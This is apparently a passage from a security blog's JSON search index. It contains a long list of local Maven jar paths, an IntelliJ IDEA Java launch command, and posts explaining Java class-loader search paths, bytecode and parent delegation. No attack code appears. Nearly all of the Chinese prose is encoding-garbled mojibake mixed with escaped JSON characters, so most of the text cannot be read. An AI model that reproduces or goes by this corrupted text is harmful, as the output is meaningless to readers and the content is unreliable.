file:/C:/Users/Dan/.m2/repository/org/jboss/shrinkwrap/shrinkwrap-spi/1.2.6/shrinkwrap-spi-1.2.6.jar file:/C:/Users/Dan/.m2/repository/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-spi-maven-archive/2.2.6/shrinkwrap-resolver-spi-maven-archive-2.2.6.jar file:/C:/Users/Dan/.m2/repository/org/eclipse/sisu/org.eclipse.sisu.plexus/0.3.0.M1/org.eclipse.sisu.plexus-0.3.0.M1.jar file:/C:/Users/Dan/.m2/repository/org/eclipse/sisu/org.eclipse.sisu.inject/0.3.0.M1/org.eclipse.sisu.inject-0.3.0.M1.jar file:/C:/Users/Dan/.m2/repository/org/codehaus/plexus/plexus-compiler-javac/2.3/plexus-compiler-javac-2.3.jar file:/C:/Users/Dan/.m2/repository/org/codehaus/plexus/plexus-compiler-api/2.3/plexus-compiler-api-2.3.jar file:/C:/Users/Dan/.m2/repository/org/javassist/javassist/3.19.0-GA/javassist-3.19.0-GA.jar file:/C:/Users/Dan/.m2/repository/com/nqzero/permit-reflect/0.3/permit-reflect-0.3.jar file:/C:/Users/Dan/.m2/repository/commons-codec/commons-codec/1.9/commons-codec-1.9.jar file:/C:/Users/Dan/.m2/repository/commons-io/commons-io/2.6/commons-io-2.6.jar file:/C:/Users/Dan/.m2/repository/org/jenkins-ci/main/remoting/2.55/remoting-2.55.jar file:/C:/Users/Dan/.m2/repository/org/jenkins-ci/constant-pool-scanner/1.2/constant-pool-scanner-1.2.jar file:/C:/Users/Dan/.m2/repository/org/jboss/logging/jboss-logging/3.3.0.Final/jboss-logging-3.3.0.Final.jar file:/C:/Users/Dan/.m2/repository/org/jboss/remoting/jboss-remoting/4.0.19.Final/jboss-remoting-4.0.19.Final.jar file:/C:/Users/Dan/.m2/repository/org/jboss/xnio/xnio-api/3.3.4.Final/xnio-api-3.3.4.Final.jar file:/C:/Users/Dan/.m2/repository/org/jboss/jboss-common-core/2.5.0.Final/jboss-common-core-2.5.0.Final.jar file:/C:/Users/Dan/.m2/repository/org/jboss/xnio/xnio-nio/3.3.4.Final/xnio-nio-3.3.4.Final.jar file:/C:/Users/Dan/.m2/repository/org/jboss/sasl/jboss-sasl/1.0.5.Final/jboss-sasl-1.0.5.Final.jar file:/C:/Users/Dan/.m2/repository/org/jboss/remotingjmx/remoting-jmx/2.0.1.Final/remoting-jmx-2.0.1.Final.jar file:/C:/Users/Dan/.m2/repository/org/jboss/logging/jboss-logging-processor/1.2.0.Final/jboss-logging-processor-1.2.0.Final.jar file:/C:/Users/Dan/.m2/repository/org/jboss/jdeparser/jdeparser/1.0.0.Final/jdeparser-1.0.0.Final.jar file:/C:/Users/Dan/.m2/repository/org/jboss/marshalling/jboss-marshalling/1.4.10.Final/jboss-marshalling-1.4.10.Final.jar file:/C:/Users/Dan/.m2/repository/org/jboss/marshalling/jboss-marshalling-river/1.4.10.Final/jboss-marshalling-river-1.4.10.Final.jar file:/C:/Users/Dan/.m2/repository/commons-collections/commons-collections/3.1/commons-collections-3.1.jar file:/C:/Users/Dan/.m2/repository/org/beanshell/bsh/2.0b5/bsh-2.0b5.jar file:/C:/Users/Dan/.m2/repository/commons-beanutils/commons-beanutils/1.9.2/commons-beanutils-1.9.2.jar file:/C:/Users/Dan/.m2/repository/commons-logging/commons-logging/1.1.1/commons-logging-1.1.1.jar file:/C:/Users/Dan/.m2/repository/org/apache/commons/commons-collections4/4.0/commons-collections4-4.0.jar file:/C:/Users/Dan/.m2/repository/org/codehaus/groovy/groovy/2.3.9/groovy-2.3.9.jar file:/C:/Users/Dan/.m2/repository/org/springframework/spring-core/4.1.4.RELEASE/spring-core-4.1.4.RELEASE.jar file:/C:/Users/Dan/.m2/repository/org/springframework/spring-beans/4.1.4.RELEASE/spring-beans-4.1.4.RELEASE.jar file:/C:/Users/Dan/.m2/repository/org/hibernate/hibernate-core/4.3.11.Final/hibernate-core-4.3.11.Final.jar file:/C:/Users/Dan/.m2/repository/org/jboss/logging/jboss-logging-annotations/1.2.0.Beta1/jboss-logging-annotations-1.2.0.Beta1.jar file:/C:/Users/Dan/.m2/repository/org/jboss/spec/javax/transaction/jboss-transaction-api_1.2_spec/1.0.0.Final/jboss-transaction-api_1.2_spec-1.0.0.Final.jar file:/C:/Users/Dan/.m2/repository/dom4j/dom4j/1.6.1/dom4j-1.6.1.jar file:/C:/Users/Dan/.m2/repository/xml-apis/xml-apis/1.0.b2/xml-apis-1.0.b2.jar file:/C:/Users/Dan/.m2/repository/org/hibernate/common/hibernate-commons-annotations/4.0.5.Final/hibernate-commons-annotations-4.0.5.Final.jar file:/C:/Users/Dan/.m2/repository/org/hibernate/javax/persistence/hibernate-jpa-2.1-api/1.0.0.Final/hibernate-jpa-2.1-api-1.0.0.Final.jar file:/C:/Users/Dan/.m2/repository/antlr/antlr/2.7.7/antlr-2.7.7.jar file:/C:/Users/Dan/.m2/repository/org/jboss/jandex/1.1.0.Final/jandex-1.1.0.Final.jar file:/C:/Users/Dan/.m2/repository/org/springframework/spring-aop/4.1.4.RELEASE/spring-aop-4.1.4.RELEASE.jar file:/C:/Users/Dan/.m2/repository/aopalliance/aopalliance/1.0/aopalliance-1.0.jar file:/C:/Users/Dan/.m2/repository/net/sf/json-lib/json-lib/2.4/json-lib-2.4-jdk15.jar file:/C:/Users/Dan/.m2/repository/commons-lang/commons-lang/2.5/commons-lang-2.5.jar file:/C:/Users/Dan/.m2/repository/net/sf/ezmorph/ezmorph/1.0.6/ezmorph-1.0.6.jar file:/C:/Users/Dan/.m2/repository/commons-fileupload/commons-fileupload/1.3/commons-fileupload-1.3.jar file:/C:/Users/Dan/.m2/repository/org/apache/wicket/wicket-util/6.23.0/wicket-util-6.23.0.jar file:/C:/Users/Dan/.m2/repository/com/mchange/c3p0/0.9.5.2/c3p0-0.9.5.2.jar file:/C:/Users/Dan/.m2/repository/com/mchange/mchange-commons-java/0.2.11/mchange-commons-java-0.2.11.jar file:/C:/Users/Dan/.m2/repository/javax/servlet/javax.servlet-api/3.1.0/javax.servlet-api-3.1.0.jar file:/C:/Users/Dan/.m2/repository/org/apache/myfaces/core/myfaces-impl/2.2.9/myfaces-impl-2.2.9.jar file:/C:/Users/Dan/.m2/repository/org/apache/myfaces/core/myfaces-api/2.2.9/myfaces-api-2.2.9.jar file:/C:/Users/Dan/.m2/repository/org/apache/geronimo/specs/geronimo-atinject_1.0_spec/1.0/geronimo-atinject_1.0_spec-1.0.jar file:/C:/Users/Dan/.m2/repository/commons-digester/commons-digester/1.8/commons-digester-1.8.jar file:/C:/Users/Dan/.m2/repository/xalan/xalan/2.7.2/xalan-2.7.2.jar file:/C:/Users/Dan/.m2/repository/xalan/serializer/2.7.2/serializer-2.7.2.jar file:/C:/Users/Dan/.m2/repository/rome/rome/1.0/rome-1.0.jar file:/C:/Users/Dan/.m2/repository/jdom/jdom/1.0/jdom-1.0.jar file:/C:/Users/Dan/.m2/repository/org/python/jython-standalone/2.5.2/jython-standalone-2.5.2.jar file:/C:/Users/Dan/.m2/repository/rhino/js/1.7R2/js-1.7R2.jar file:/C:/Users/Dan/.m2/repository/javassist/javassist/3.12.0.GA/javassist-3.12.0.GA.jar file:/C:/Users/Dan/.m2/repository/org/jboss/weld/weld-core/1.1.33.Final/weld-core-1.1.33.Final.jar file:/C:/Users/Dan/.m2/repository/org/jboss/weld/weld-api/1.1.Final/weld-api-1.1.Final.jar file:/C:/Users/Dan/.m2/repository/org/jboss/weld/weld-spi/1.1.Final/weld-spi-1.1.Final.jar file:/C:/Users/Dan/.m2/repository/javax/annotation/jsr250-api/1.0/jsr250-api-1.0.jar file:/C:/Users/Dan/.m2/repository/org/jboss/spec/javax/interceptor/jboss-interceptors-api_1.1_spec/1.0.0.Beta1/jboss-interceptors-api_1.1_spec-1.0.0.Beta1.jar file:/C:/Users/Dan/.m2/repository/org/slf4j/slf4j-ext/1.7.2/slf4j-ext-1.7.2.jar file:/C:/Users/Dan/.m2/repository/ch/qos/cal10n/cal10n-api/0.7.7/cal10n-api-0.7.7.jar file:/C:/Users/Dan/.m2/repository/org/jboss/interceptor/jboss-interceptor-core/2.0.0.Final/jboss-interceptor-core-2.0.0.Final.jar file:/C:/Users/Dan/.m2/repository/org/jboss/interceptor/jboss-interceptor-spi/2.0.0.Final/jboss-interceptor-spi-2.0.0.Final.jar file:/C:/Users/Dan/.m2/repository/javax/enterprise/cdi-api/1.0-SP1/cdi-api-1.0-SP1.jar file:/C:/Users/Dan/.m2/repository/org/jboss/interceptor/jboss-interceptor-api/1.1/jboss-interceptor-api-1.1.jar file:/C:/Users/Dan/.m2/repository/javax/inject/javax.inject/1/javax.inject-1.jar file:/C:/Users/Dan/.m2/repository/javax/interceptor/javax.interceptor-api/3.1/javax.interceptor-api-3.1.jar file:/C:/Users/Dan/.m2/repository/org/slf4j/slf4j-api/1.7.21/slf4j-api-1.7.21.jar file:/C:/Users/Dan/.m2/repository/org/slf4j/slf4j-jdk14/1.7.21/slf4j-jdk14-1.7.21.jar file:/C:/Users/Dan/.m2/repository/org/clojure/clojure/1.8.0/clojure-1.8.0.jar file:/C:/Users/Dan/.m2/repository/com/vaadin/vaadin-server/7.7.14/vaadin-server-7.7.14.jar file:/C:/Users/Dan/.m2/repository/com/vaadin/vaadin-sass-compiler/0.9.13/vaadin-sass-compiler-0.9.13.jar file:/C:/Users/Dan/.m2/repository/org/w3c/css/sac/1.3/sac-1.3.jar file:/C:/Users/Dan/.m2/repository/com/vaadin/external/flute/flute/1.3.0.gg2/flute-1.3.0.gg2.jar file:/C:/Users/Dan/.m2/repository/com/vaadin/vaadin-shared/7.7.14/vaadin-shared-7.7.14.jar file:/C:/Users/Dan/.m2/repository/org/jsoup/jsoup/1.8.3/jsoup-1.8.3.jar file:/C:/Users/Dan/.m2/repository/org/aspectj/aspectjweaver/1.9.5/aspectjweaver-1.9.5.jar file:/C:/Users/Dan/.m2/repository/org/apache/click/click-nodeps/2.3.0/click-nodeps-2.3.0.jar file:/C:/Users/Dan/.m2/repository/ognl/ognl/2.6.9/ognl-2.6.9.jar file:/C:/Users/Dan/.m2/repository/org/apache/velocity/velocity/1.7/velocity-1.7.jar file:/C:/Users/Dan/.m2/repository/org/mortbay/jasper/apache-el/8.0.27/apache-el-8.0.27.jar file:/D:/Program%20Files/JetBrains/IntelliJ%20IDEA%202024.2.3/lib/idea_rt.jar ---------------------------- å¯¹æ¯”å›¾å¦‚ä¸‹ï¼š\nå‘ç°åœ¨AppClassLoader LoadPathè¿™ä¸€æ å¢åŠ äº†å·¨é‡çš„jaræ–‡ä»¶ï¼Œè¿™æ˜¯æ€ä¹ˆå›äº‹ï¼Ÿ\nåŸå› æ˜¯å› ä¸ºIDEAçš„å¯åŠ¨è¯­å¥\n1 \u0026#34;D:\\Program Files\\Java\\jdk1.8.0_181\\bin\\java.exe\u0026#34; \u0026#34;-javaagent:D:\\Program Files\\JetBrains\\IntelliJ IDEA 2024.2.3\\lib\\idea_rt.jar=1928:D:\\Program Files\\JetBrains\\IntelliJ IDEA 2024.2.3\\bin\u0026#34; -Dfile.encoding=UTF-8 -classpath \u0026#34;D:\\Program Files\\Java\\jdk1.8.0_181\\jre\\lib\\charsets.jar;......#è¶…çº§å¤š\u0026#34; com.study.java.MainTest å¯ä»¥çœ‹åˆ°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç¡®å®šå¯åŠ¨çš„javaç¨‹åºå…¨è·¯å¾„ï¼Œç¬¬äºŒä¸ª-javaagentå‚æ•°æš‚æ—¶ä¸åšå­¦ä¹ \n-Dfile.encoding=UTF-8æ˜¯åšäº†ç¼–ç ç»Ÿä¸€ï¼Œæœ€åå°±æ˜¯-classpathæŒ‡å®šClassPath è¿™ä¸ªå‚æ•°åé¢è·Ÿäº†å¾ˆå¤šåŒ…è·¯å¾„\næ‰€ä»¥æœ€åï¼ŒIDEAåªæ˜¯æ ¹æ®æˆ‘ä»¬çš„è®¾ç½®å»è‡ªåŠ¨é…ç½®å¥½äº†éœ€è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œä¸éœ€è¦æˆ‘ä»¬å»æ‰‹åŠ¨é…ç½®ç›¸å…³ç¯å¢ƒ\nè±ªç”¨ï¼Œçˆ±ç”¨\nTips è‡ªJDK 1.2ä»¥åï¼ŒJVMé‡‡ç”¨äº†å§”æ‰˜(delegate)æ¨¡å¼æ¥è½½å…¥classã€‚é‡‡ç”¨è¿™ç§è®¾è®¡çš„åŸå› å¯ä»¥å‚è€ƒï¼š http://java.sun.com/docs/books/tutorial/ext/basics/load.html ExtClassLoader å’Œ AppClassLoaderåœ¨JVMå¯åŠ¨åï¼Œä¼šåœ¨JVMä¸­ä¿å­˜ä¸€ä»½ï¼Œå¹¶ä¸”åœ¨ç¨‹åºè¿è¡Œä¸­æ— æ³•æ”¹å˜å…¶æœç´¢è·¯å¾„ã€‚å¦‚æœæƒ³åœ¨è¿è¡Œæ—¶ä»å…¶ä»–æœç´¢è·¯å¾„åŠ è½½ç±»ï¼Œå°±è¦äº§ç”Ÿæ–°çš„ç±»åŠ è½½å™¨ã€‚ å‚è€ƒ https://blog.csdn.net/sayyy/article/details/81120749 ï¼ï¼\n","date":"2024-11-07T16:22:58+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20241107162525270.png","permalink":"https://d4n-sec.github.io/p/classloaderloadpath/","title":"Javaé»˜è®¤ç±»åŠ è½½å™¨çš„åŠ è½½è·¯å¾„"},{"content":"æœ¬ç« æ·±å…¥äº†è§£Javaå­—èŠ‚ç ä»¥åŠåŠ è½½Javaå­—èŠ‚ç çš„ç±»åŠ è½½å™¨ç›¸å…³å§¿åŠ¿\nJavaå­—èŠ‚ç  Java åœ¨åˆšåˆšè¯ç”Ÿä¹‹æ—¶æ›¾ç»æå‡ºè¿‡ä¸€ä¸ªéå¸¸è‘—åçš„å£å·: â€œä¸€æ¬¡ç¼–å†™ï¼Œåˆ°å¤„è¿è¡Œï¼ˆwrite onceï¼Œrun anywhereï¼‰â€ï¼Œè¿™å¥è¯å……åˆ†è¡¨è¾¾äº†è½¯ä»¶å¼€å‘äººå‘˜å¯¹å†²ç ´å¹³å°ç•Œé™çš„æ¸´æ±‚ã€‚â€œä¸å¹³å°æ— å…³â€çš„ç†æƒ³æœ€ç»ˆå®ç°åœ¨æ“ä½œç³»ç»Ÿçš„è¿ç”¨å±‚ä¸Š: è™šæ‹Ÿæœºæä¾›å•†å¼€å‘äº†è®¸å¤šå¯ä»¥è¿è¡Œåœ¨ä¸åŒå¹³å°ä¸Šçš„è™šæ‹Ÿæœºï¼Œè¿™äº›è™šæ‹Ÿæœºéƒ½å¯ä»¥è½½å…¥å’Œæ‰§è¡ŒåŒä¸€ç§å¹³å°æ— å…³çš„å­—èŠ‚ç ï¼Œä»è€Œå®ç°äº†ç¨‹åºçš„â€œä¸€æ¬¡ç¼–å†™åˆ°å¤„è¿è¡Œâ€ã€‚\nå„ç§ä¸åŒå¹³å°çš„è™šæ‹Ÿæœºä¸æ‰€æœ‰å¹³å°éƒ½ç»Ÿä¸€ä½¿ç”¨çš„ç¨‹åºå­˜å‚¨æ ¼å¼â€”å­—èŠ‚ç ï¼ˆByteCodeï¼‰ï¼Œå› æ­¤ï¼Œå¯ä»¥çœ‹å‡ºå­—èŠ‚ç å¯¹ Java ç”Ÿæ€çš„é‡è¦æ€§ã€‚ä¹‹æ‰€ä»¥è¢«ç§°ä¸ºå­—èŠ‚ç ï¼Œæ˜¯å› ä¸ºå­—èŠ‚ç æ˜¯ç”±åå…­è¿›åˆ¶ç»„æˆçš„ï¼Œè€Œ JVMï¼ˆJava Virtual Machineï¼‰ä»¥ä¸¤ä¸ªåå…­è¿›åˆ¶ä¸ºä¸€ç»„ï¼Œå³ä»¥å­—èŠ‚ä¸ºå•ä½è¿›è¡Œè¯»å–ã€‚åœ¨ Java ä¸­ä½¿ç”¨ javac å‘½ä»¤æŠŠæºä»£ç ç¼–è¯‘æˆå­—èŠ‚ç æ–‡ä»¶ï¼Œä¸€ä¸ª .java æºæ–‡ä»¶ä»ç¼–è¯‘æˆ .class å­—èŠ‚ç æ–‡ä»¶çš„ç¤ºä¾‹\nç”±æ­¤å¯è§ï¼ŒJavaå­—èŠ‚ç æ˜¯â€œä¸å¹³å°æ— å…³â€çš„å…³é”®ç‚¹ã€‚ä¸”è¦è¯´æ˜çš„æ˜¯ï¼Œåªè¦èƒ½ç”Ÿæˆç¬¦åˆ JVM å­—èŠ‚ç è§„èŒƒçš„æ–‡ä»¶ï¼Œéƒ½å¯ä»¥è®¤ä¸ºæ˜¯Javaå­—èŠ‚ç æ–‡ä»¶ï¼Œæ¥æºä¸ä¸€å®šæ˜¯.javaæ–‡ä»¶æˆ–è€…javacç¼–è¯‘ç”Ÿæˆï¼Œpythonä¹Ÿå¯ä»¥ï¼ŒGolangä¹Ÿè¡Œã€‚\nç”šè‡³ï¼Œåªè¦èƒ½å¤Ÿåœ¨JVMä¸­æ¢å¤ä¸ºä¸€ä¸ªç±»çš„å­—èŠ‚åºåˆ—ï¼Œä¹Ÿå¯ä»¥ç§°ä¹‹ä¸ºJavaå­—èŠ‚ç ï¼Œä¾‹å¦‚BCELç \nåç»­éç‰¹æ®Šæƒ…å†µç®€ç§°å­—èŠ‚ç \nJavaç±»åŠ è½½å™¨ ä»€ä¹ˆæ˜¯Javaç±»åŠ è½½å™¨ å®šä¹‰å®Œå­—èŠ‚ç ï¼Œè¿˜éœ€è¦äº†è§£ä¸€ä¸ªä¸œè¥¿ï¼Œå«åšç±»åŠ è½½å™¨ - ClassLoader\nJavaçš„ClassLoaderæ˜¯æ ¹æ®å­—èŠ‚ç åŠ è½½ç±»çš„æœ€åŸºç¡€çš„æ–¹æ³•ï¼Œè´Ÿè´£å°†ç±»çš„å­—èŠ‚ç åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œå¹¶å°†å…¶è½¬æ¢ä¸ºå¯æ‰§è¡Œçš„Javaå¯¹è±¡ã€‚\nClassLoaderä¼šå‘Šè¯‰Javaè™šæ‹Ÿæœºå¦‚ä½•åŠ è½½è¿™ä¸ªç±»ã€‚Javaé»˜è®¤çš„ ClassLoaderå°±æ˜¯æ ¹æ®ç±»åæ¥åŠ è½½ç±»ï¼Œè¿™ä¸ªç±»åæ˜¯ç±»å®Œæ•´è·¯å¾„ï¼Œå¦‚java.lang.Runtime\nåœ¨Javaä¸­ï¼Œæ¯ä¸ªç±»éƒ½ç”±ç±»åŠ è½½å™¨åŠ è½½ï¼Œå¹¶åœ¨è¿è¡Œæ—¶è¢«åˆ›å»ºä¸ºä¸€ä¸ªClasså¯¹è±¡ã€‚ç±»åŠ è½½å™¨è´Ÿè´£ä»æ–‡ä»¶ç³»ç»Ÿã€ç½‘ç»œæˆ–å…¶ä»–æ¥æºä¸­åŠ è½½ç±»çš„å­—èŠ‚ç ï¼Œå¹¶å°†å…¶è½¬æ¢ä¸ºå¯æ‰§è¡Œçš„Javaå¯¹è±¡ã€‚ç±»åŠ è½½å™¨è¿˜è´Ÿè´£è§£æç±»çš„ä¾èµ–å…³ç³»ï¼Œå³åŠ è½½æ‰€éœ€çš„å…¶ä»–ç±»ã€‚\nJavaç±»åŠ è½½å™¨æœ‰å“ªäº› Javaè™šæ‹Ÿæœºå®šä¹‰äº†ä¸‰ä¸ªä¸»è¦çš„ç±»åŠ è½½å™¨ï¼š\nå¯åŠ¨ç±»åŠ è½½å™¨ï¼ˆBootstrap Class Loaderï¼‰ï¼šä¹Ÿç§°ä¸ºæ ¹ç±»åŠ è½½å™¨ï¼Œå®ƒè´Ÿè´£åŠ è½½Javaè™šæ‹Ÿæœºçš„æ ¸å¿ƒç±»åº“ï¼Œå¦‚java.lang.Objectç­‰ã€‚å¯åŠ¨ç±»åŠ è½½å™¨æ˜¯è™šæ‹Ÿæœºå®ç°çš„ä¸€éƒ¨åˆ†ï¼Œå®ƒé€šå¸¸æ˜¯ç”±C++ç­‰åº•å±‚è¯­è¨€å®ç°çš„ï¼Œè€Œä¸æ˜¯Javaå®ç°ã€‚ æ‰©å±•ç±»åŠ è½½å™¨ï¼ˆExtension Class Loaderï¼‰ï¼šå®ƒæ˜¯ç”¨æ¥åŠ è½½Javaæ‰©å±•ç±»åº“çš„ç±»åŠ è½½å™¨ã€‚æ‰©å±•ç±»åº“åŒ…æ‹¬javaxå’Œjava.utilç­‰åŒ…ï¼Œå®ƒä»¬ä½äºjre/lib/extç›®å½•ä¸‹ã€‚ åº”ç”¨ç¨‹åºç±»åŠ è½½å™¨ï¼ˆApplication Class Loaderï¼‰ï¼šä¹Ÿç§°ä¸ºç³»ç»Ÿç±»åŠ è½½å™¨ï¼Œå®ƒè´Ÿè´£åŠ è½½åº”ç”¨ç¨‹åºçš„ç±»ã€‚å®ƒä¼šæœç´¢åº”ç”¨ç¨‹åºçš„ç±»è·¯å¾„ï¼ˆåŒ…æ‹¬ç”¨æˆ·å®šä¹‰çš„ç±»è·¯å¾„å’Œç³»ç»Ÿç±»è·¯å¾„ï¼‰ï¼Œå¹¶åŠ è½½ç±»æ–‡ä»¶ã€‚ é™¤äº†è¿™ä¸‰ä¸ªä¸»è¦çš„ç±»åŠ è½½å™¨ï¼ŒJavaè¿˜æ”¯æŒè‡ªå®šä¹‰ç±»åŠ è½½å™¨ï¼Œå¼€å‘äººå‘˜å¯ä»¥æ ¹æ®éœ€è¦å®ç°è‡ªå·±çš„ç±»åŠ è½½å™¨ã€‚\nJavaç±»åŠ è½½å™¨åšä»€ä¹ˆ ç±»åŠ è½½å™¨çš„å·¥ä½œå¯ä»¥ç®€åŒ–ä¸ºä¸‰ä¸ªæ­¥éª¤ï¼š\nåŠ è½½ï¼ˆLoadingï¼‰ï¼šæ ¹æ®ç±»çš„å…¨é™å®šåï¼ˆåŒ…æ‹¬åŒ…è·¯å¾„å’Œç±»åï¼‰ï¼Œå®šä½å¹¶è¯»å–ç±»æ–‡ä»¶çš„å­—èŠ‚ç ã€‚\né“¾æ¥ï¼ˆLinkingï¼‰ï¼šå°†ç±»çš„å­—èŠ‚ç è½¬æ¢ä¸ºå¯ä»¥åœ¨è™šæ‹Ÿæœºä¸­è¿è¡Œçš„æ ¼å¼ã€‚\né“¾æ¥è¿‡ç¨‹åŒ…æ‹¬ä¸‰ä¸ªé˜¶æ®µï¼š\nâ€‹\t1ï¼‰éªŒè¯ï¼ˆVerificationï¼‰ï¼šéªŒè¯å­—èŠ‚ç çš„æ­£ç¡®æ€§å’Œå®‰å…¨æ€§ï¼Œç¡®ä¿å®ƒç¬¦åˆJavaè™šæ‹Ÿæœºçš„è§„èŒƒã€‚\nâ€‹\t2ï¼‰å‡†å¤‡ï¼ˆPreparationï¼‰ï¼šä¸ºç±»çš„é™æ€å˜é‡åˆ†é…å†…å­˜ï¼Œå¹¶è®¾ç½®é»˜è®¤çš„åˆå§‹å€¼ã€‚\nâ€‹\t3ï¼‰è§£æï¼ˆResolutionï¼‰ï¼šå°†ç±»çš„ç¬¦å·å¼•ç”¨ï¼ˆæ¯”å¦‚æ–¹æ³•å’Œå­—æ®µçš„å¼•ç”¨ï¼‰è§£æä¸ºç›´æ¥å¼•ç”¨ï¼ˆå†…å­˜åœ°å€ï¼‰ã€‚\nåˆå§‹åŒ–ï¼ˆInitializationï¼‰ï¼šæ‰§è¡Œç±»çš„åˆå§‹åŒ–ä»£ç ï¼ŒåŒ…æ‹¬é™æ€å˜é‡çš„èµ‹å€¼å’Œé™æ€å—çš„æ‰§è¡Œã€‚ Javaç±»åŠ è½½å™¨æ€ä¹ˆåš Javaç±»åŠ è½½å™¨å®è¡Œçš„æ˜¯åŒäº²å§”æ´¾æœºåˆ¶\næœ€ä¸Šæ–¹çš„ClassLoadæ˜¯æœ€çˆ¶ç±»çš„Loaderï¼Œç›®å‰å¯ä»¥è¿™æ ·ç†è§£\nåœ¨å›¾ä¸­å¯ä»¥æ˜æ˜¾çœ‹å‡ºæ¥ï¼Œåœ¨ç¬¦åˆJavaçš„æ¨èæ ‡å‡†çš„æƒ…å†µä¸‹ï¼Œç±»åŠ è½½å™¨çš„ç»§æ‰¿é¡ºåºæ˜¯\nUser Define ClassLoader -\u0026gt; Application ClassLoader -\u0026gt; Extension ClassLoader -\u0026gt; Bootstrap ClassLoader\nä½†æ˜¯åŠ è½½é¡ºåºå´ä¸ä¸€å®šï¼ŒClassLoaderæ”¶åˆ°åŠ è½½è¯·æ±‚æ—¶ï¼Œä¼šåšå¤§è‡´ä¸¤ä»¶äº‹æ¥ç¡®å®šåŠ è½½é¡ºåº\nä¾‹å¦‚ï¼šéœ€è¦åŠ è½½ç±»Boyæ—¶ï¼š\nClassLoaderAæŸ¥çœ‹è‡ªèº«æ˜¯å¦å·²ç»åŠ è½½è¿‡Boyï¼Œå¦‚æœæœ‰ç›´æ¥è¿”å›ï¼Œå¦‚æœæ²¡æœ‰ï¼Œä¼šå°†è¯·æ±‚ç»™åˆ°çˆ¶ç±»ClassLoaderB å¦‚æœä¸‹ä¸€ä¸ªClassLoaderBå¹¶æ²¡æœ‰åŠ è½½æˆ–è€…è¿”å›Boyç±»å¹¶ç»“æŸäº†ï¼ŒClassLoaderAä¼šå°è¯•åŠ è½½Boy ClassLoaderBä¼šåšå’ŒClassLoaderAç›¸åŒçš„äº‹\nå¦‚æœç»“åˆå›¾æ¥çœ‹ï¼Œå†ç»™ä¸ªå®Œå…¨çš„æ —å­ï¼š\nå‡è®¾ç±»Boyæ²¡æœ‰è¢«åŠ è½½è¿‡ï¼Œä¸”Boyç±»å­—èŠ‚ç è¢«åŠ å¯†ï¼Œæœ€ç»ˆåªèƒ½è¢«User Define ClassLoaderè§£å¯†åŠ è½½ï¼Œé‚£ä¹ˆæ‰§è¡Œæµä¼šå¦‚ä¸‹\nUser Define ClassLoader æŸ¥çœ‹è‡ªèº«æ˜¯å¦å·²ç»åŠ è½½è¿‡Boyï¼Œç”±äºBoyæ²¡æœ‰è¢«åŠ è½½è¿‡ï¼Œæ‰€ä»¥å¤±è´¥ï¼Œè¯·æ±‚ç»™åˆ°çˆ¶ç±»Application ClassLoader Application ClassLoaderæŸ¥çœ‹è‡ªèº«æ˜¯å¦å·²ç»åŠ è½½è¿‡Boyï¼Œç”±äºBoyæ²¡æœ‰è¢«åŠ è½½è¿‡ï¼Œæ‰€ä»¥å¤±è´¥ï¼Œè¯·æ±‚ç»™åˆ°çˆ¶ç±»Extension ClassLoader Extension ClassLoaderæŸ¥çœ‹è‡ªèº«æ˜¯å¦å·²ç»åŠ è½½è¿‡Boyï¼Œç”±äºBoyæ²¡æœ‰è¢«åŠ è½½è¿‡ï¼Œæ‰€ä»¥å¤±è´¥ï¼Œè¯·æ±‚ç»™åˆ°çˆ¶ç±»Bootstrap ClassLoader Bootstrap ClassLoaderæŸ¥çœ‹è‡ªèº«æ˜¯å¦å·²ç»åŠ è½½è¿‡Boyï¼Œç”±äºBoyæ²¡æœ‰è¢«åŠ è½½è¿‡ï¼Œæ‰€ä»¥å¤±è´¥ï¼Œæ²¡æœ‰çˆ¶ç±»ï¼Œå°è¯•åŠ è½½ï¼ŒåŠ è½½å¤±è´¥ï¼Œå› ä¸ºä¸æ˜¯Javaè™šæ‹Ÿæœºçš„æ ¸å¿ƒç±»ï¼Œè¿”å› æ‰§è¡Œæµå›åˆ°Extension ClassLoaderï¼Œçˆ¶ç±»æ²¡æœ‰åŠ è½½ï¼Œå°è¯•åŠ è½½ï¼ŒåŠ è½½å¤±è´¥ï¼Œå› ä¸ºBoyç±»ä¸æ˜¯Javaæ‰©å±•ç±»ï¼Œè¿”å› æ‰§è¡Œæµå›åˆ°Application ClassLoaderï¼Œçˆ¶ç±»æ²¡æœ‰åŠ è½½ï¼Œå°è¯•åŠ è½½ï¼ŒåŠ è½½å¤±è´¥ï¼ŒBoyç±»æ— æ³•è¯†åˆ«ï¼ˆå› ä¸ºæ˜¯ç”¨æˆ·åŠ å¯†äº†ï¼‰ï¼Œè¿”å› æ‰§è¡Œæµå›åˆ°User Define ClassLoaderï¼Œçˆ¶ç±»æ²¡æœ‰åŠ è½½ï¼Œå°è¯•è§£å¯†å¹¶åŠ è½½ï¼ŒåŠ è½½æˆåŠŸ åŒäº²å§”æ´¾çš„ä¼˜åŠ£ ä¼˜ç‚¹ å› ä¸ºåŒäº²å§”æ´¾æ˜¯å‘ä¸Šå§”æ‰˜åŠ è½½çš„ï¼Œæ‰€ä»¥å®ƒå¯ä»¥ç¡®ä¿ç±»åªè¢«åŠ è½½ä¸€æ¬¡ã€‚\nå…±äº«åŠŸèƒ½ï¼šä¸€äº›frameworkå±‚çº§çš„ç±»ä¸€æ—¦è¢«é¡¶å±‚åŠ è½½å™¨åŠ è½½ï¼Œç¼“å­˜åœ¨å†…å­˜ã€‚åœ¨å…¶ä»–ä»»ä½•åœ°æ–¹ç”¨åˆ°æ—¶ï¼Œéƒ½éµå®ˆåŒäº²åŠ è½½æœºåˆ¶ï¼Œæ´¾å‘åˆ°é¡¶å±‚åŠ è½½å™¨å› å·²ç»åŠ è½½ï¼Œæ‰€ä»¥éƒ½ä¸éœ€è¦é‡æ–°åŠ è½½ï¼Œé¿å…é‡å¤åŠ è½½\né¿å…æ ¸å¿ƒç±»è¢«ä¸²æ”¹ï¼šJavaçš„æ ¸å¿ƒAPIéƒ½æ˜¯é€šè¿‡å¼•å¯¼ç±»åŠ è½½å™¨è¿›è¡ŒåŠ è½½çš„ï¼Œå¦‚æœåˆ«äººé€šè¿‡å®šä¹‰åŒæ ·è·¯å¾„çš„ç±»æ¯”å¦‚java.lang.Integerï¼Œç±»åŠ 